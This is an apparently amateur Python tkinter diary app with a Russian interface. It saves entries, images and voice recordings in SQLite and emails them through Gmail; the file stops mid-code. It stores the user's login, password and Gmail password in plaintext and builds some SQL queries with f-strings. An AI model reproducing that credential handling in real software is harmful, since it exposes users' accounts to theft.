from tkinter import Tk, Label, LabelFrame, W, messagebox, Text, END, Listbox, ANCHOR, WORD, \
    Scrollbar, Y, Frame, HORIZONTAL, VERTICAL, RIGHT, ttk, StringVar, Toplevel, filedialog
import sqlite3
from datetime import datetime
import webbrowser
from PIL import ImageTk, Image
from docx import Document
import os
import shutil
import threading
import pyaudio
import wave
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.audio import MIMEAudio
import subprocess


def main():
    # window diary
    def main_window():
        def _on_key_release(event):
            ctrl = (event.state & 0x4) != 0
            if event.keycode == 88 and ctrl and event.keysym.lower() != "x":
                event.widget.event_generate("<<Cut>>")

            if event.keycode == 86 and ctrl and event.keysym.lower() != "v":
                event.widget.event_generate("<<Paste>>")

            if event.keycode == 67 and ctrl and event.keysym.lower() != "c":
                event.widget.event_generate("<<Copy>>")

            if event.keycode == 65 and ctrl and event.keysym.lower() != "a":
                event.widget.event_generate("<<SelectAll>>")

        def save():
            nonlocal count_record, picture_symbol, picture_n, full_path_picture, \
                full_path_sound, sound_name, sound_symbol
            time = datetime.now().strftime("%d.%m.%Y - %H:%M:%S")
            if full_path_picture != '':
                old_path = full_path_picture
                if full_path_picture.rfind('logs_ps\\') != -1:
                    full_path_picture = full_path_picture[
                                        :full_path_picture.rfind('logs_ps\\')] + 'pictures\\' + picture_n
                    shutil.copyfile(old_path, full_path_picture)
                    os.remove(old_path)
                elif full_path_picture.rfind('pictures\\') != -1:
                    picture_n = str(picture_n[0])
                    full_path_picture = full_path_picture[
                                        :full_path_picture.rfind('pictures\\')] + 'pictures\\copy_' + picture_n[
                                        :-4] + datetime.now().strftime("%d-%m-%Y %H.%M.%S") + '.jpg'
                    shutil.copyfile(old_path, full_path_picture)
                    picture_n = os.path.basename(full_path_picture)

            if full_path_sound != '':
                old_path = full_path_sound
                stop_sound()
                if full_path_sound.rfind('logs_ps\\') != -1:
                    full_path_sound = full_path_sound[
                                      :full_path_sound.rfind('logs_ps\\')] + 'records\\' + sound_name
                    shutil.move(old_path, full_path_sound)
                elif full_path_sound.rfind('records\\') != -1:
                    sound_name = str(sound_name[0])
                    full_path_sound = full_path_sound[
                                      :full_path_sound.rfind('records\\')] + 'records\\copy_' + sound_name[
                                      :-4] + datetime.now().strftime("%d-%m-%Y %H.%M.%S") + '.wav'
                    shutil.copyfile(old_path, full_path_sound)
                    sound_name = os.path.basename(full_path_sound)
            try:
                cursor.execute(
                    f"INSERT INTO {table_name} (login, password, date, name, text, picture_name, picture_path, "
                    f"picture_symbol, sound_name, sound_path, sound_symbol) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    (user_login, user_password, time, name.get(), text.get('1.0', END), picture_n, full_path_picture,
                     picture_symbol, sound_name, full_path_sound, sound_symbol))
            except sqlite3.InterfaceError:
                cursor.execute(
                    f"INSERT INTO {table_name} (login, password, date, name, text, picture_name, picture_path, "
                    f"picture_symbol, sound_name, sound_path, sound_symbol) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    (user_login, user_password, time, name.get(), text.get('1.0', END), str(picture_n[0]),
                     full_path_picture, picture_symbol, sound_name, full_path_sound, sound_symbol))
            db.commit()
            list_records.delete(0, END)
            count_record = 0
            for item1 in cursor.execute(f'SELECT id, date, picture_symbol, sound_symbol, name FROM {table_name}'):
                if item1[2] == '' and item1[3] == '':
                    item_list = list(item1)
                    item_list.remove('')
                    item_list.remove('')
                    item1 = item_list
                    list_records.insert(0, item1)
                    count_record += 1
                elif item1[2] == '' or item1[3] == '':
                    item_list = list(item1)
                    item_list.remove('')
                    item1 = item_list
                    list_records.insert(0, item1)
                    count_record += 1
                else:
                    list_records.insert(0, item1)
                    count_record += 1
            journal_lab = Label(diary, text=f"Журнал записей (всего: {count_record})", bg='white',
                                font=('Comic Sans MS', 11))
            journal_lab.place(x=26, y=125)
            delete_button['state'] = 'normal'
            open_button['state'] = 'normal'
            picture_n = ''
            full_path_picture = ''
            picture_symbol = ''
            attached_picture_but['state'] = 'disabled'
            name_label_picture_main['text'] = picture_n
            sound_name = ''
            sound_symbol = ''
            full_path_sound = ''
            attached_sound_but['state'] = 'disabled'
            name_label_sound_main['text'] = sound_name
            name.delete(0, END)
            name.insert(0, 'no_name')
            name['foreground'] = 'gray55'
            text.delete(1.0, END)

            play_sound_but.place_forget()
            stop_sound_but.place_forget()

        def setting():
            nonlocal last_size, last_font
            settings = Tk()
            settings.title('Settings')
            x_value = (settings.winfo_screenwidth() - 375) / 2
            y_value = (settings.winfo_screenheight() - 160) / 2
            settings.wm_geometry("+%d+%d" % (x_value, y_value))
            settings.geometry('375x160')
            settings.resizable(False, False)
            settings['bg'] = 'gray90'

            keys_log = Label(settings, text='Сочетание клавиш для быстрого входа: ctrl +        (англ.буква)',
                             bg='gray90')
            keys_log.place(relx=0.04, rely=0.15)

            key_two = ttk.Entry(settings, width=2)
            key_two.place(relx=0.725, rely=0.144)
            key_two.insert(1, install_char)

            # Label font
            ttk.Label(settings, text="Шрифт:", background='gray90').place(relx=0.043, rely=0.32)

            n = StringVar()
            shrift_choosen = ttk.Combobox(settings, width=22, textvariable=n, state='readonly')

            # Adding combobox drop down list
            shrift_choosen['values'] = ('Comic Sans MS', 'Segoe Script', 'Cambria')

            shrift_choosen.place(relx=0.17, rely=0.31)

            # Shows comic sans MS as a default value
            for item2, numb in enumerate(shrift_choosen['values']):
                if numb == last_font:
                    shrift_choosen.current(item2)

            def set_font(_):
                nonlocal last_font
                last_font = shrift_choosen.get()

            shrift_choosen.bind("<<ComboboxSelected>>", set_font)
            # Label font size
            ttk.Label(settings, text="Размер шрифта:", background='gray90').place(relx=0.043, rely=0.49)
            n2 = StringVar()
            size_choosen = ttk.Combobox(settings, width=3, textvariable=n2, state='readonly')
            # Adding combobox drop down list
            size_choosen['values'] = ('10', '12', '14')
            size_choosen.place(relx=0.30, rely=0.48)
            # Shows 12 as a default value
            for item3, numb in enumerate(size_choosen['values']):
                if numb == last_size:
                    size_choosen.current(item3)

            def set_port(_):
                nonlocal last_size
                last_size = size_choosen.get()

            size_choosen.bind("<<ComboboxSelected>>", set_port)

            def add_keys():
                nonlocal enter, install_char
                enter = key_two.get()
                list_enter = [enter]
                cursor.execute(f"UPDATE last_user SET char = (?) WHERE user_id = last_insert_rowid()",
                               list_enter)
                db.commit()
                install_char = enter
                if last_font == 'Comic Sans MS' and last_size == '10':
                    text.configure(font=(last_font, int(last_size)), height=15, width=72)
                elif last_font == 'Comic Sans MS' and last_size == '12':
                    text.configure(font=(last_font, int(last_size)), height=12, width=58)
                elif last_font == 'Comic Sans MS' and last_size == '14':
                    text.configure(font=(last_font, int(last_size)), height=11, width=48)
                elif last_font == 'Segoe Script' and last_size == '10':
                    text.configure(font=(last_font, int(last_size)), height=14, width=58)
                elif last_font == 'Segoe Script' and last_size == '12':
                    text.configure(font=(last_font, int(last_size)), height=11, width=48)
                elif last_font == 'Segoe Script' and last_size == '14':
                    text.configure(font=(last_font, int(last_size)), height=9, width=41)
                elif last_font == 'Cambria' and last_size == '10':
                    text.configure(font=(last_font, int(last_size)), height=19, width=83)
                elif last_font == 'Cambria' and last_size == '12':
                    text.configure(font=(last_font, int(last_size)), height=15, width=65)
                elif last_font == 'Cambria' and last_size == '14':
                    text.configure(font=(last_font, int(last_size)), height=13, width=53)
                settings.destroy()

            style_keys = ttk.Style()
            style_keys.configure('keys.TButton', font=('Comic Sans MS', 8))
            keys_button = ttk.Button(settings, text='Применить', command=add_keys, cursor="hand2")

            keys_button.place(relx=0.75, rely=0.74)

        def delete_trash():
            nonlocal picture_n, picture_symbol, sound_name, sound_symbol
            try:
                if full_path_picture.rfind('logs_ps') != -1:
                    os.remove(full_path_picture)
                    picture_n = ''
                    name_label_picture_main['text'] = picture_n
                    attached_picture_but['state'] = 'disabled'
                    picture_symbol = ''
                elif full_path_picture.rfind('pictures') != -1:
                    picture_n = ''
                    name_label_picture_main['text'] = picture_n
                    attached_picture_but['state'] = 'disabled'
                    picture_symbol = ''
            except FileNotFoundError:
                pass

            try:
                if full_path_sound.rfind('logs_ps') != -1:
                    os.remove(full_path_sound)
                    sound_name = ''
                    name_label_sound_main['text'] = sound_name
                    attached_sound_but['state'] = 'disabled'
                    sound_symbol = ''
                elif full_path_sound.rfind('records') != -1:
                    sound_name = ''
                    name_label_sound_main['text'] = sound_name
                    attached_sound_but['state'] = 'disabled'
                    sound_symbol = ''
                play_sound_but.place_forget()
                stop_sound_but.place_forget()
            except FileNotFoundError:
                pass

        def delete():
            nonlocal count_record, full_path_picture, full_path_sound

            stop_sound()
            try:
                date_rec = list_records.get(ANCHOR)
                result = messagebox.askyesno('My diary', f'Вы действительно хотите удалить запись "{date_rec[0]}"?')
                if result:
                    delete_trash()
                    for item_delete in cursor.execute(
                            f'SELECT picture_path FROM {table_name} WHERE id = {date_rec[0]}'):
                        full_path_picture = str(item_delete[0])
                    for item_delete2 in cursor.execute(
                            f'SELECT sound_path FROM {table_name} WHERE id = {date_rec[0]}'):
                        full_path_sound = str(item_delete2[0])
                    cursor.execute(f'DELETE FROM {table_name} WHERE id = {date_rec[0]}')
                    db.commit()
                    name_label_sound_main['text'] = ''
                    name_label_picture_main['text'] = ''
            except IndexError:
                pass
            try:
                if full_path_picture != '':
                    os.remove(full_path_picture)
                    full_path_picture = ''
            except IndexError:
                pass
            except FileNotFoundError:
                name.insert(0, 'Изображение не найдено! ')
            try:
                if full_path_sound != '':
                    os.remove(full_path_sound)
                    full_path_sound = ''
            except IndexError:
                pass
            except FileNotFoundError:
                name.insert(0, 'Аудио не найдено! ')

            list_records.delete(ANCHOR)
            count_record -= 1

            journal_lab = Label(diary, text=f"Журнал записей (всего: {count_record})", bg='white',
                                font=('Comic Sans MS', 11))
            journal_lab.place(x=26, y=125)

            attached_sound_but['state'] = 'disabled'
            play_sound_but.place_forget()
            stop_sound_but.place_forget()

            if count_record == 0:
                delete_button['state'] = 'disabled'
                open_button['state'] = 'disabled'

        def open_record():
            nonlocal full_path_picture, picture_symbol, picture_n, full_path_sound, sound_name, sound_symbol
            stop_sound()
            delete_trash()
            date_rec = list_records.get(ANCHOR)
            try:
                for item4 in cursor.execute(f'SELECT name FROM {table_name} WHERE id = {date_rec[0]}'):
                    name.delete(0, END)
                    n = str(item4)
                    name.insert(0, n[2:-3])
                    name['foreground'] = 'grey20'

                for item5 in cursor.execute(f'SELECT text FROM {table_name} WHERE id = {date_rec[0]}'):
                    text.delete(1.0, END)
                    string = str(item5)
                    num = string.count(r'\n') + 1
                    text.insert(1.0, item5)
                    text.delete(1.0)
                    text.delete(f'{num}.0')

                for item_name_picture in cursor.execute(
                        f'SELECT picture_name FROM {table_name} WHERE id = {date_rec[0]}'):
                    if item_name_picture == ('',):
                        name_label_picture_main['text'] = ''
                    else:
                        picture_n = item_name_picture
                        picture_n = str(picture_n[0])
                        if len(picture_n) <= 24:
                            name_label_picture_main['text'] = picture_n
                        else:
                            name_label_picture_main['text'] = picture_n[:24] + '...'

                for item_path_picture in cursor.execute(
                        f'SELECT picture_path FROM {table_name} WHERE id = {date_rec[0]}'):
                    string_path_picture = str(item_path_picture[0])
                    if item_path_picture != ('',):
                        attached_picture_but['state'] = 'active'
                        full_path_picture = string_path_picture
                        picture_symbol = '✅'
                    else:
                        attached_picture_but['state'] = 'disabled'
                        full_path_picture = ''
            except IndexError:
                pass
            except FileNotFoundError:
                name.insert(0, 'Изображение не найдено! ')

            try:
                for item_name_sound in cursor.execute(
                        f'SELECT sound_name FROM {table_name} WHERE id = {date_rec[0]}'):
                    if item_name_sound == ('',):
                        name_label_sound_main['text'] = ''
                    else:
                        sound_name = item_name_sound
                        sound_name = str(sound_name[0])
                        if len(sound_name) <= 24:
                            name_label_sound_main['text'] = sound_name
                        else:
                            name_label_sound_main['text'] = sound_name[:24] + '...'

                for item_path_sound in cursor.execute(
                        f'SELECT sound_path FROM {table_name} WHERE id = {date_rec[0]}'):
                    string_path_sound = str(item_path_sound[0])
                    if item_path_sound != ('',):
                        attached_sound_but['state'] = 'active'
                        full_path_sound = string_path_sound
                        sound_symbol = '♬'
                        stop_sound_but.place(x=858, y=183)
                        play_sound_but.place(x=830, y=183)
                    else:
                        attached_sound_but['state'] = 'disabled'
                        full_path_sound = ''
            except IndexError:
                pass
            except FileNotFoundError:
                name.insert(0, 'Аудио не найдено! ')

        def new_record():
            nonlocal full_path_picture, picture_n, picture_symbol, full_path_sound, sound_name, sound_symbol
            try:
                stop_sound()
                delete_trash()
                name.delete(0, END)
                name.insert(0, 'no_name')
                text.delete(1.0, END)
                full_path_picture = ''
                picture_n = ''
                picture_symbol = ''
                name_label_picture_main['text'] = picture_n
                attached_picture_but['state'] = 'disabled'

                full_path_sound = ''
                sound_name = ''
                sound_symbol = ''
                name_label_sound_main['text'] = sound_name
                attached_sound_but['state'] = 'disabled'

                play_sound_but.place_forget()
                stop_sound_but.place_forget()
            except FileNotFoundError:
                pass

        def insert_text():
            file = filedialog.askopenfilename(filetypes=[("All files", "*"), ("JPEG", "*.jpg"), ("DOCX", ".docx"),
                                                         ("PNG", "*.png"), ("TXT", "*.txt")])
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    s = f.read()
                    name.delete(0, END)
                    srez = file.rfind('/') + 1
                    name.insert(0, file[srez:-4])
                    text.delete(1.0, END)
                    text.insert(1.0, s)
            except FileNotFoundError:
                pass
            except UnicodeDecodeError:
                if file.find('.docx') != -1 or file.find('.doc') != -1:
                    doc = Document(file)
                    text2 = []
                    for paragraph in doc.paragraphs:
                        text2.append(paragraph.text)
                    name.delete(0, END)
                    srez = file.rfind('/') + 1
                    name.insert(0, file[srez:-5])
                    text.delete(1.0, END)
                    text.insert(1.0, '\n'.join(text2))
                elif file.find('.jpeg') != -1 or file.find('.jpg') != -1 or file.find('.png') != -1:
                    photo_level = Toplevel(diary)
                    photo_level.title("Photo")
                    img_open = Image.open(file)
                    w, b = img_open.size
                    w1 = w / 850
                    b1 = b / 520
                    if w1 <= 1 and b1 <= 1:
                        img_open = img_open.resize((w, b), Image.BILINEAR)
                    elif w1 > b1:
                        img_open = img_open.resize((int(w / w1), int(b / w1)), Image.BILINEAR)
                    else:
                        img_open = img_open.resize((int(w / b1), int(b / b1)), Image.BILINEAR)
                    img_tk = ImageTk.PhotoImage(img_open)
                    label_img = Label(photo_level, image=img_tk)
                    label_img.image = img_tk
                    label_img.pack()
                    x_coordinate = (photo_level.winfo_screenwidth() - 850) / 2
                    y_coordinate = (photo_level.winfo_screenheight() - 520) / 2
                    photo_level.wm_geometry("+%d+%d" % (x_coordinate, y_coordinate))
                    photo_level.resizable(False, False)
                    photo_level.mainloop()

        def add_file():
            nonlocal full_path_picture, picture_n, picture_symbol, full_path_sound, sound_name, sound_symbol

            def add_picture():
                nonlocal full_path_picture, picture_n, picture_symbol
                try:
                    picture = filedialog.askopenfilename(
                        filetypes=[("All files", "*"), ("JPEG", "*.jpeg"), ("PNG", "*.png")])
                    attach_level.focus_force()
                    if picture.find('.jpeg') != -1 or picture.find('.jpg') != -1 or picture.find(
                            '.png') != -1 or picture.find('.ico') != -1 or picture.find('.JPEG') != -1 or \
                            picture.find('.JPG') != -1 or picture.find('.PNG') != -1 or picture.find('.ICO') != -1:
                        picture_n = os.path.basename(picture)
                        path_db = os.path.abspath('db_diary.db')
                        path_db_without_file = path_db[:path_db.rfind('\\') + 1]
                        if not os.path.isdir('.\\pictures'):
                            os.mkdir('pictures')
                        if not os.path.isdir('.\\logs_ps'):
                            os.mkdir('logs_ps')
                        full_path_picture = path_db_without_file + 'logs_ps\\' + picture_n
                        shutil.copyfile(picture, full_path_picture)

                        ok_label_picture['fg'] = 'green2'
                        if len(picture_n) <= 20:
                            name_label_picture['text'] = picture_n
                        else:
                            name_label_picture['text'] = picture_n[:20] + '...'

                        if len(picture_n) <= 24:
                            name_label_picture_main['text'] = picture_n
                        else:
                            name_label_picture_main['text'] = picture_n[:24] + '...'

                        attached_picture_but['state'] = 'active'
                        picture_symbol = '✅'
                except UnicodeDecodeError:
                    pass
                except FileNotFoundError:
                    pass
                except shutil.SameFileError:
                    name_label_picture['text'] = 'Выбери иной каталог!'

            def add_sound():
                nonlocal full_path_sound, sound_name, sound_symbol

                class App():
                    chunk = 1024
                    sample_format = pyaudio.paInt16
                    channels = 2
                    fs = 44100

                    frames = []

                    def __init__(self, _):
                        self.isrecording = False
                        self.button1 = ttk.Button(attach_level, text='Старт', command=self.startrecording, width=7,
                                                  cursor="hand2")
                        self.button2 = ttk.Button(attach_level, text='Стоп', command=self.stoprecording, width=7,
                                                  cursor="hand2")

                        self.button1.place(x=30, y=110)
                        self.button2.place(x=90, y=110)

                    def startrecording(self):
                        self.p = pyaudio.PyAudio()
                        self.stream = self.p.open(format=self.sample_format, channels=self.channels, rate=self.fs,
                                                  frames_per_buffer=self.chunk, input=True)
                        self.isrecording = True

                        self.label = Label(attach_level, text="0:00", font="Arial 10", bg="gray90", fg="red")
                        self.label.place(relx=0.39, rely=0.554)
                        self.label.after_idle(self.tick_tack)
                        self.all_sec = 0
                        self.m = 0
                        self.s = 0

                        t = threading.Thread(target=self.record)
                        t.start()

                    def stoprecording(self):
                        nonlocal full_path_sound, sound_name, sound_symbol
                        try:
                            self.isrecording = False
                            sound_name = datetime.now().strftime("%d-%m-%Y %H.%M.%S")
                            sound_name = sound_name + ".wav"
                            wf = wave.open(sound_name, 'wb')
                            wf.setnchannels(self.channels)
                            wf.setsampwidth(self.p.get_sample_size(self.sample_format))
                            wf.setframerate(self.fs)
                            wf.writeframes(b''.join(self.frames))
                            wf.close()

                            self.sound_old_path = os.path.abspath(sound_name)
                            self.path_db = os.path.abspath('db_diary.db')
                            self.path_db_without_file = self.path_db[:self.path_db.rfind('\\') + 1]
                            if not os.path.isdir('.\\records'):
                                os.mkdir('records')
                            if not os.path.isdir('.\\logs_ps'):
                                os.mkdir('logs_ps')
                            full_path_sound = self.path_db_without_file + 'logs_ps\\' + sound_name
                            shutil.move(self.sound_old_path, full_path_sound)

                            ok_label_sound['fg'] = 'green2'

                            name_label_sound['text'] = sound_name
                            name_label_sound_main['text'] = sound_name

                            attached_sound_but['state'] = 'active'
                            sound_symbol = '♬'
                            stop_sound_but.place(x=858, y=183)
                            play_sound_but.place(x=830, y=183)
                        except AttributeError:
                            pass

                    def tick_tack(self):
                        if self.m == 0 and self.s == 0:
                            self.label.config(text='time: 0:00')
                        elif self.m >= 0 and self.s >= 10:
                            self.label.config(text='time: {0}:{1}'.format(self.m, self.s))
                        elif self.m >= 0 and self.s // 10 <= 1:
                            self.label.config(text='time: {0}:{1}'.format(self.m, ('0' + str(self.s))))

                        self.m = self.all_sec // 60
                        self.s = self.all_sec % 60
                        self.all_sec += 1
                        if self.isrecording:
                            self.label.after(1000, self.tick_tack)

                    def record(self):
                        while self.isrecording:
                            data = self.stream.read(self.chunk)
                            self.frames.append(data)

                rec_sound = App(attach_level)

            def destroy_attach_window():
                attach_level.destroy()

            attach_level = Toplevel(diary)
            attach_level.title('Attach file')
            x_coordinate = (attach_level.winfo_screenwidth() - 400) / 2
            y_coordinate = (attach_level.winfo_screenheight() - 200) / 2
            attach_level.wm_geometry("+%d+%d" % (x_coordinate, y_coordinate))
            attach_level.geometry('400x200')
            attach_level.resizable(False, False)
            attach_level['bg'] = 'gray90'

            style_add_picture = ttk.Style()
            style_add_picture.configure('add_picture.TButton', font=('Comic Sans MS', 9))
            add_picture = ttk.Button(attach_level, text="Прикрепить картинку", command=add_picture,
                                     style='add_picture.TButton', cursor="hand2")
            add_picture.place(x=30, y=30)

            style_add_sound = ttk.Style()
            style_add_sound.configure('add_sound.TButton', font=('Comic Sans MS', 9))
            add_sound = ttk.Button(attach_level, text="Записать голосовое сообщение", command=add_sound,
                                   style='add_sound.TButton', cursor="hand2")
            add_sound.place(x=30, y=70)

            ok_label_picture = Label(attach_level, text='✔', font=('Segoe Script', 12), bg='gray90', fg='gray60')
            ok_label_picture.place(x=174, y=30)

            name_label_picture = Label(attach_level, text='', font=('Comic Sans MS', 10), bg='gray90')
            name_label_picture.place(x=200, y=33)

            ok_label_sound = Label(attach_level, text='✔', font=('Segoe Script', 12), bg='gray90', fg='gray60')
            ok_label_sound.place(x=232, y=70)

            name_label_sound = Label(attach_level, text='', font=('Comic Sans MS', 10), bg='gray90')
            name_label_sound.place(x=30, y=140)

            style_ok = ttk.Style()
            style_ok.configure('ok.TButton', font=('Comic Sans MS', 10))
            ok_but = ttk.Button(attach_level, text="OK", command=destroy_attach_window, style='ok_but.TButton',
                                cursor="hand2")
            ok_but.place(x=302, y=157)

            attach_level.mainloop()

        def send_file():
            nonlocal email_db_insert, password_email_db_insert, count_enter_send

            def send():
                try:
                    msg = MIMEMultipart()
                    password_email = my_password.get()
                    msg['From'] = my_email.get()
                    msg['To'] = email_to.get()
                    msg['Subject'] = name.get()
                    message = text.get(1.0, END)
                    msg.attach(MIMEText(message))

                    if full_path_picture != '':
                        with open(full_path_picture, 'rb') as f_p:
                            data_pic = f_p.read()
                        msg.attach(MIMEImage(data_pic, name='picture'))
                    if full_path_sound != '':
                        with open(full_path_sound, 'rb') as f_r:
                            data_rec = f_r.read()
                        msg.attach(MIMEAudio(data_rec, name='record, add \'.wav\''))

                    email_db = my_email.get()
                    list_email_db_in = [email_db]
                    password_db = my_password.get()
                    list_password_db_in = [password_db]
                    cursor.execute(f"UPDATE last_user SET email = (?) WHERE user_id = last_insert_rowid()",
                                   list_email_db_in)
                    db.commit()
                    cursor.execute(f"UPDATE last_user SET password_email = (?) WHERE user_id = last_insert_rowid()",
                                   list_password_db_in)
                    db.commit()

                    server = smtplib.SMTP('smtp.gmail.com', 587)
                    server.starttls()
                    server.login(msg['From'], password_email)
                    server.sendmail(msg['From'], msg['To'], msg.as_string())
                    server.quit()
                    label_result['text'] = 'Отправлено!'
                    label_result['fg'] = 'green3'
                    label_result['font'] = ('Comic sans MS', 11)
                    label_result.place(x=50, y=282)
                except smtplib.SMTPAuthenticationError:
                    label_result['fg'] = 'red'
                    label_result['font'] = ('Comic sans MS', 8)
                    label_result['text'] = 'Ошибка! Проверьте входные данные либо доступ к аккаунту'
                except TypeError:
                    label_result['fg'] = 'red'
                    label_result['font'] = ('Comic sans MS', 8)
                    label_result['text'] = 'Ошибка! Введите данные'

            def callback(_):
                webbrowser.open_new(r"https://www.google.com/settings/security/lesssecureapps")

            send_message = Toplevel(diary)
            send_message.title('Send message')
            x_coordinate = (send_message.winfo_screenwidth() - 500) / 2
            y_coordinate = (send_message.winfo_screenheight() - 330) / 2
            send_message.wm_geometry("+%d+%d" % (x_coordinate, y_coordinate))
            send_message.geometry('500x330')
            send_message.resizable(False, False)
            send_message['bg'] = 'gray90'
            count_enter_send += 1

            label_main_send = Label(send_message, text='Отправка записи на почту Gmail', font=('Comic Sans MS', 12),
                                    bg='gray90', fg='gray10')
            label_main_send.place(x=134, y=15)

            label_account = Label(send_message, text='Вход в учетную запись', font=('Comic Sans MS', 11),
                                  bg='gray90', fg='gray15')
            label_account.place(x=30, y=50)

            label_email_my = Label(send_message, text='email:', font=('Comic Sans MS', 11),
                                   bg='gray90', fg='gray15')
            label_email_my.place(x=50, y=80)

            label_password = Label(send_message, text='password:', font=('Comic Sans MS', 11),
                                   bg='gray90', fg='gray15')
            label_password.place(x=50, y=110)

            label_periphery_send = Label(send_message, text='Отправить на почту', font=('Comic Sans MS', 11),
                                         bg='gray90', fg='gray15')
            label_periphery_send.place(x=30, y=140)

            label_email_to = Label(send_message, text='email:', font=('Comic Sans MS', 11),
                                   bg='gray90', fg='gray15')
            label_email_to.place(x=50, y=170)

            label_clarification = Label(send_message, text='(можно себе)', font=('Comic Sans MS', 11),
                                        bg='gray90', fg='gray15')
            label_clarification.place(x=335, y=170)

            label_note = Label(send_message,
                               text='''*** для входа на свою почту из этой программы, необходимо открыть доступ
            к ней из своего аккаунта, сделать это можно перейдя по ссылке:      ''',
                               font=('Comic Sans MS', 8), bg='gray90', fg='gray15')
            label_note.place(x=30, y=210)

            label_note_link = Label(send_message,
                                    text='https://www.google.com/settings/security/lesssecureapps',
                                    font=('Comic Sans MS', 8), bg='gray90', fg='blue', cursor="hand2")
            label_note_link.place(x=100, y=241)
            label_note_link.bind("<Button-1>", callback)

            label_result = Label(send_message, text='', font=('Comic Sans MS', 11), bg='gray90', fg='green3')
            label_result.place(x=30, y=285)

            my_email = ttk.Entry(send_message, width=25, font=('Comic Sans MS', 11), foreground='gray20')
            my_email.place(x=100, y=80)

            my_password = ttk.Entry(send_message, width=22, font=('Comic Sans MS', 11), foreground='gray20', show='○')
            my_password.place(x=130, y=110)

            email_to = ttk.Entry(send_message, width=25, font=('Comic Sans MS', 11), foreground='gray20')
            email_to.place(x=100, y=170)

            try:
                cursor.execute('SELECT email FROM last_user ORDER BY user_id DESC')
                if count_user == 1 or count_enter_send > 1:
                    for i_e in cursor.fetchone():
                        email_db_insert = i_e
                        my_email.insert(0, email_db_insert)
                for _ in cursor.fetchone():
                    pass
                if count_enter_send < 2:
                    for item_e2 in cursor.fetchone():
                        email_db_insert = item_e2
                        my_email.insert(0, email_db_insert)
            except TypeError:
                pass
            try:
                cursor.execute('SELECT password_email FROM last_user ORDER BY user_id DESC')
                if count_user == 1 or count_enter_send > 1:
                    for i_ep in cursor.fetchone():
                        password_email_db_insert = i_ep
                        my_password.insert(0, password_email_db_insert)
                for _ in cursor.fetchone():
                    pass
                if count_enter_send < 2:
                    for item_ep2 in cursor.fetchone():
                        password_email_db_insert = item_ep2
                        my_password.insert(0, password_email_db_insert)
            except TypeError:
                pass

            style_send = ttk.Style()
            style_send.configure('send.TButton', font=('Comic Sans MS', 11))
            send = ttk.Button(send_message, text="Отправить", command=send, style='send.TButton', cursor="hand2")
            send.place(relx=0.74, rely=0.85)

            send_message.mainloop()

        def attached_picture():
            nonlocal full_path_picture, picture_n
            try:
                if full_path_picture.find('.jpg') != -1 or full_path_picture.find('.png') != -1 \
                        or full_path_picture.find('.jpeg') != -1 or full_path_picture.find('.ico') != -1 or \
                        full_path_picture.find('.JPG') != -1 or full_path_picture.find('.PNG') != -1 \
                        or full_path_picture.find('.JPEG') != -1 or full_path_picture.find('.ICO') != -1:
                    photo_level = Toplevel(diary)
                    photo_level.title(picture_n)
                    img_open = Image.open(full_path_picture)
                    w, b = img_open.size
                    w1 = w / 850
                    b1 = b / 520
                    if w1 <= 1 and b1 <= 1:
                        img_open = img_open.resize((w, b), Image.BILINEAR)
                    elif w1 > b1:
                        img_open = img_open.resize((int(w / w1), int(b / w1)), Image.BILINEAR)
                    else:
                        img_open = img_open.resize((int(w / b1), int(b / b1)), Image.BILINEAR)
                    img_tk = ImageTk.PhotoImage(img_open)
                    label_img = Label(photo_level, image=img_tk)
                    label_img.image = img_tk
                    label_img.pack()
                    x_coordinate = (photo_level.winfo_screenwidth() - 850) / 2
                    y_coordinate = (photo_level.winfo_screenheight() - 520) / 2
                    photo_level.wm_geometry("+%d+%d" % (x_coordinate, y_coordinate))
                    photo_level.resizable(False, False)
                    photo_level.mainloop()
            except FileNotFoundError:
                name.insert(0, "Изображение не найдено! ")

        def search():
            request = google_search.get()
            if request != 'Google':
                if request.find('http') != -1 or request.find('www') != -1:
                    webbrowser.open_new(f"{request}")
                else:
                    webbrowser.open_new(rf"https://www.google.com/search?q={request}")

        def search_enter(_):
            request = google_search.get()
            if request.find('http') != -1 or request.find('www') != -1:
                webbrowser.open_new(f"{request}")
            else:
                webbrowser.open_new(rf"https://www.google.com/search?q={request}")

        def on_entry_click(_):
            if google_search.get() == 'Google':
                google_search.delete(0, "end")  # delete all the text in the entry
                google_search.insert(0, '')  # Insert blank for user input
                google_search.config(foreground='black')

        def on_focusout(_):
            if google_search.get() == '':
                google_search.insert(0, 'Google')
                google_search.config(foreground='grey47')

        def on_entry_click_name(_):
            if name.get() == 'no_name':
                name.delete(0, "end")  # delete all the text in the entry
                name.insert(0, '')  # Insert blank for user input
                name.config(foreground='grey20')

        def on_focusout_name(_):
            if name.get() == '':
                name.insert(0, 'no_name')
                name.config(foreground='grey60')

        def play_sound():
            nonlocal full_path_sound, is_playing, my_thread

            def play_audio():
                nonlocal is_playing
                chunk = 1024
                wf = wave.open(full_path_sound, 'rb')
                p = pyaudio.PyAudio()

                stream = p.open(
                    format=p.get_format_from_width(wf.getsampwidth()),
                    channels=wf.getnchannels(),
                    rate=wf.getframerate(),
                    output=True)

                data = wf.readframes(chunk)

                while data != '' and is_playing:  # is_playing to stop playing
                    stream.write(data)
                    data = wf.readframes(chunk)

                stream.stop_stream()
                stream.close()
                p.terminate()

            stop_sound()
            if not is_playing:
                is_playing = True
                my_thread = threading.Thread(target=play_audio)
                my_thread.start()

        def stop_sound():
            nonlocal is_playing, my_thread
            if is_playing:
                is_playing = False
                my_thread.join()

        def on_closing():
            if messagebox.askokcancel("Выход", "Вы действительно хотите выйти?"):
                stop_sound()
                diary.destroy()
                path_db = os.path.abspath('db_diary.db')
                path_db_without_file = path_db[:path_db.rfind('\\') + 1]
                if os.path.isdir('.\\logs_ps'):
                    full_path_folder = path_db_without_file + 'logs_ps\\'
                    shutil.rmtree(full_path_folder, ignore_errors=True)

        user_login = login.get()
        user_password = password.get()
        root.destroy()
        diary = Tk()
        diary.title('My diary')
        x_coord = (diary.winfo_screenwidth() - 920) / 2
        y_coord = (diary.winfo_screenheight() - 560) / 2
        diary.wm_geometry("+%d+%d" % (x_coord, y_coord))
        diary.geometry('920x560')
        diary.resizable(False, False)
        diary['bg'] = 'white'
        diary.attributes("-alpha", 0.95)

        try:
            diary.iconbitmap('diary_icon.ico')
        except FileNotFoundError:
            pass

        try:
